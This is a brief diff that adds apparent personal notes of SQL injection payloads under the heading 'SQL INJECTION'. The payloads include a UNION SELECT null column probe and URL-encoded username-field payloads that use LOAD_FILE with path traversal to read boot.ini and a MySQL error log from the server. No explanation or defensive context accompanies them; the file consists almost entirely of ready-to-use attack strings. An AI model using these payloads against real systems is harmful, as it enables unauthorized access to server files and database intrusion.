@@ -1,0 +1,7 @@
+###SQL INJECTION
+
+
+			'union select null,null,null,null --
+username=%27+union+select+null%2CLOAD_FILE('..\\..\\..\\..\\..\\boot.ini')%2Cnull%2Cnull+--+
+		%27+union+select+null%2CLOAD_FILE('mysql_error.log')%2Cnull%2Cnull+--+
+password=
